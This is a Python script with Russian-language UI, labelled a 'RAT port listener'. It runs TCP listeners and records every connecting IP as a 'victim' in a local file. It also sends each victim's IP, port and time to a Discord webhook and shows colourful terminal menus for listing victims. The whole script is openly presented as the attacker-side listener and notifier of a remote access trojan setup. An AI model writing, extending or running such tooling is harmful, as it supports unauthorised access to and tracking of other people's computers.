#!/usr/bin/env python3
# RAT PORT LISTENER by @DADILK
# С АНИМАЦИЕЙ, CLEAR, WEBHOOK И ССЫЛКАМИ

import socket
import threading
import time
import os
import sys
import json
import requests
from datetime import datetime

# ============================================
# ФАЙЛЫ ДЛЯ СОХРАНЕНИЯ
# ============================================
CONFIG_FILE = 'rat_config.json'
VICTIMS_FILE = 'rat_victims.txt'

# ============================================
# ЦВЕТА ДЛЯ ТЕРМИНАЛА
# ============================================
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    MAGENTA = '\033[35m'
    WHITE = '\033[97m'

# ============================================
# ХРАНИЛИЩЕ ПОРТОВ
# ============================================
ports = {}  # {port: {"name": "", "status": "", "thread": "", "victims": []}}

# ============================================
# ФУНКЦИЯ ОЧИСТКИ ЭКРАНА
# ============================================
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

# ============================================
# ЗАГРУЗКА/СОХРАНЕНИЕ НАСТРОЕК
# ============================================
def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {"webhook": ""}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

# ============================================
# ФУНКЦИЯ ДЛЯ ССЫЛОК (БЕЗ НАДПИСИ ГЕНЕРАТОР)
# ============================================
def get_port_links(port):
    """Возвращает ссылки для порта"""
    return {
        "local": f"http://localhost:{port}",
        "host": f"http://0.0.0.0:{port}",
        "raw": f"0.0.0.0:{port}"
    }

def show_port_info(port, name):
    """Показывает информацию о порте со ссылками"""
    links = get_port_links(port)
    
    print(f"\n{Colors.CYAN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.YELLOW}              ПОРТ {port} - {name}{' ' * (35 - len(str(port)) - len(name))}{Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}╠══════════════════════════════════════════════════════════╣{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.GREEN} 📌 Локально:  {Colors.WHITE}{links['local']:<40}{Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.GREEN} 📌 Хост:      {Colors.WHITE}{links['host']:<40}{Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.GREEN} 📌 RAW:       {Colors.WHITE}{links['raw']:<40}{Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════╝{Colors.END}")
    return links

# ============================================
# ОТПРАВКА В WEBHOOK
# ============================================
def send_webhook(webhook_url, data):
    """Отправляет уведомление о новой жертве"""
    if not webhook_url:
        return False
    
    try:
        webhook_data = {
            "embeds": [{
                "title": "🔥 НОВАЯ ЖЕРТВА В СЕТИ",
                "color": 16711680,
                "fields": [
                    {"name": "📌 Порт", "value": f"```{data['port']}```", "inline": True},
                    {"name": "📝 Имя", "value": f"```{data['port_name']}```", "inline": True},
                    {"name": "🌐 IP", "value": f"```{data['ip']}```", "inline": False},
                    {"name": "🔗 Ссылка", "value": f"```0.0.0.0:{data['port']}```", "inline": False},
                    {"name": "🕐 Время", "value": f"```{data['time']}```", "inline": False}
                ],
                "footer": {"text": "RAT LISTENER by @DADILK"}
            }]
        }
        
        response = requests.post(webhook_url, json=webhook_data)
        return response.status_code == 204
    except:
        return False

# ============================================
# СОХРАНЕНИЕ ЖЕРТВЫ
# ============================================
def save_victim(port, ip, name):
    """Сохраняет информацию о жертве"""
    data = {
        "port": port,
        "port_name": name,
        "ip": ip,
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    with open(VICTIMS_FILE, 'a') as f:
        f.write(json.dumps(data) + '\n')
    return data

# ============================================
# ЗАПУСК ПОРТА
# ============================================
def start_port(port, name, webhook_url=""):
    """Запускает слушатель на порту"""
    
    def handle_client(client_socket, addr):
        ip = addr[0]
        
        # Сохраняем жертву
        victim_data = save_victim(port, ip, name)
        
        # Добавляем в список жертв порта
        if ip not in ports[port]["victims"]:
            ports[port]["victims"].append(ip)
        
        # Выводим в консоль
        print(f"\n{Colors.RED}╔══════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.RED}║{Colors.YELLOW}                  🔴 ЖЕРТВА В СЕТИ                      {Colors.RED}║{Colors.END}")
        print(f"{Colors.RED}╠══════════════════════════════════════════════════════════╣{Colors.END}")
        print(f"{Colors.RED}║{Colors.CYAN} 📌 Порт: {port} ({name}){' ' * (32 - len(name))}{Colors.RED}║{Colors.END}")
        print(f"{Colors.RED}║{Colors.CYAN} 🌐 IP: {ip}{' ' * (43 - len(ip))}{Colors.RED}║{Colors.END}")
        print(f"{Colors.RED}║{Colors.CYAN} 🕐 Время: {victim_data['time']}{' ' * (37 - len(victim_data['time']))}{Colors.RED}║{Colors.END}")
        print(f"{Colors.RED}║{Colors.CYAN} 🔗 Ссылка: 0.0.0.0:{port}{' ' * (32 - len(str(port)))}{Colors.RED}║{Colors.END}")
        print(f"{Colors.RED}╚══════════════════════════════════════════════════════════╝{Colors.END}")
        
        # Отправляем в webhook
        if webhook_url:
            if send_webhook(webhook_url, victim_data):
                print(f"{Colors.GREEN}✅ Уведомление отправлено{Colors.END}")
        
        try:
            client_socket.send(f"RAT {name}\n".encode())
        except:
            pass
        client_socket.close()
    
    def run_server():
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server.bind(('0.0.0.0', port))
            server.listen(5)
            server.settimeout(2)
            
            ports[port]["status"] = "🟢 ONLINE"
            
            while ports[port]["status"] == "🟢 ONLINE":
                try:
                    client, addr = server.accept()
                    client_handler = threading.Thread(target=handle_client, args=(client, addr))
                    client_handler.daemon = True
                    client_handler.start()
                except socket.timeout:
                    continue
                except:
                    break
        except Exception as e:
            ports[port]["status"] = f"🔴 ОШИБКА"
        finally:
            server.close()
            if port in ports:
                ports[port]["status"] = "🔴 OFFLINE"
    
    if port not in ports:
        ports[port] = {
            "name": name,
            "status": "🟡 ЗАПУСК...",
            "victims": []
        }
        
        # ПОКАЗЫВАЕМ ИНФОРМАЦИЮ СО ССЫЛКАМИ (БЕЗ СЛОВА "ГЕНЕРАТОР")
        show_port_info(port, name)
        
        thread = threading.Thread(target=run_server, daemon=True)
        thread.start()
        ports[port]["thread"] = thread
        time.sleep(1)
        return True
    else:
        print(f"{Colors.RED}❌ Порт {port} уже существует{Colors.END}")
        return False

# ============================================
# ОСТАНОВКА ПОРТА
# ============================================
def stop_port(port):
    if port in ports:
        ports[port]["status"] = "🔴 OFFLINE"
        print(f"{Colors.YELLOW}[-] Порт {port} остановлен{Colors.END}")
        return True
    else:
        print(f"{Colors.RED}❌ Порт {port} не найден{Colors.END}")
        return False

# ============================================
# ПОКАЗ ВСЕХ ПОРТОВ
# ============================================
def show_ports():
    print(f"\n{Colors.CYAN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.YELLOW}                 АКТИВНЫЕ ПОРТЫ                      {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}╠══════════════════════════════════════════════════════════╣{Colors.END}")
    
    if not ports:
        print(f"{Colors.CYAN}║{Colors.WHITE}  Нет активных портов{' ' * 42}{Colors.CYAN}║{Colors.END}")
    else:
        for p, data in ports.items():
            victims = len(data.get("victims", []))
            v_text = f"👤 {victims}" if victims > 0 else ""
            print(f"{Colors.CYAN}║{Colors.WHITE}  {data['status']} [{data['name']}] → 0.0.0.0:{p} {v_text:<10}{Colors.CYAN}║{Colors.END}")
    
    print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════╝{Colors.END}")

# ============================================
# ПОКАЗ ЖЕРТВ
# ============================================
def show_victims():
    print(f"\n{Colors.CYAN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.YELLOW}                   ЖЕРТВЫ В СЕТИ                     {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}╠══════════════════════════════════════════════════════════╣{Colors.END}")
    
    found = False
    for p, data in ports.items():
        for ip in data.get("victims", []):
            found = True
            print(f"{Colors.CYAN}║{Colors.RED}  👤{Colors.WHITE} {ip} → 0.0.0.0:{p} [{data['name']}]{' ' * (25 - len(data['name']))}{Colors.CYAN}║{Colors.END}")
    
    if not found:
        print(f"{Colors.CYAN}║{Colors.WHITE}  Нет жертв{' ' * 51}{Colors.CYAN}║{Colors.END}")
    
    print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════╝{Colors.END}")

# ============================================
# НАСТРОЙКА WEBHOOK
# ============================================
def setup_webhook(config):
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.YELLOW}              НАСТРОЙКА DISCORD WEBHOOK               {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════╝{Colors.END}")
    print(f"{Colors.GREEN}Текущий: {Colors.WHITE}{config['webhook'] or 'Не установлен'}{Colors.END}")
    print()
    
    new_webhook = input(f"{Colors.YELLOW}Введите новый Webhook URL (Enter = пропустить): {Colors.END}").strip()
    
    if new_webhook:
        config['webhook'] = new_webhook
        save_config(config)
        print(f"{Colors.GREEN}✅ Webhook сохранен!{Colors.END}")
    else:
        print(f"{Colors.YELLOW}⏭️ Webhook не изменен{Colors.END}")
    
    time.sleep(1)

# ============================================
# ГЛАВНОЕ МЕНЮ
# ============================================
def main():
    # Загружаем конфиг
    config = load_config()
    
    while True:
        clear_screen()
        
        # Баннер
        print(f"{Colors.RED}╔══════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.RED}║{Colors.YELLOW}              RAT PORT LISTENER by @DADILK            {Colors.RED}║{Colors.END}")
        print(f"{Colors.RED}╠══════════════════════════════════════════════════════════╣{Colors.END}")
        print(f"{Colors.RED}║{Colors.GREEN} Webhook: {Colors.WHITE}{config['webhook'][:30] + '...' if config['webhook'] else 'Не настроен'}{Colors.RED}║{Colors.END}")
        print(f"{Colors.RED}╚══════════════════════════════════════════════════════════╝{Colors.END}")
        
        # Показываем порты
        show_ports()
        
        # Меню
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.YELLOW}                        МЕНЮ                          {Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}╠══════════════════════════════════════════════════════════╣{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.WHITE} 1. Создать порт{' ' * 48}{Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.WHITE} 2. Закрыть порт{' ' * 48}{Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.WHITE} 3. Показать жертв{' ' * 46}{Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.WHITE} 4. Настроить Webhook{' ' * 42}{Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.WHITE} 0. Выход{' ' * 54}{Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════╝{Colors.END}")
        
        choice = input(f"\n{Colors.YELLOW}Выбери действие: {Colors.END}").strip()
        
        if choice == "1":
            try:
                port = int(input(f"{Colors.GREEN}Введи номер порта: {Colors.END}"))
                name = input(f"{Colors.GREEN}Введи имя порта: {Colors.END}")
                start_port(port, name, config['webhook'])
                input(f"\n{Colors.CYAN}Нажми Enter...{Colors.END}")
            except ValueError:
                print(f"{Colors.RED}Ошибка ввода{Colors.END}")
                time.sleep(1)
        
        elif choice == "2":
            try:
                port = int(input(f"{Colors.YELLOW}Введи номер порта для закрытия: {Colors.END}"))
                stop_port(port)
                input(f"\n{Colors.CYAN}Нажми Enter...{Colors.END}")
            except ValueError:
                print(f"{Colors.RED}Ошибка ввода{Colors.END}")
                time.sleep(1)
        
        elif choice == "3":
            show_victims()
            input(f"\n{Colors.CYAN}Нажми Enter...{Colors.END}")
        
        elif choice == "4":
            setup_webhook(config)
        
        elif choice == "0":
            print(f"{Colors.YELLOW}Выход...{Colors.END}")
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Выход...{Colors.END}")
        sys.exit(0)
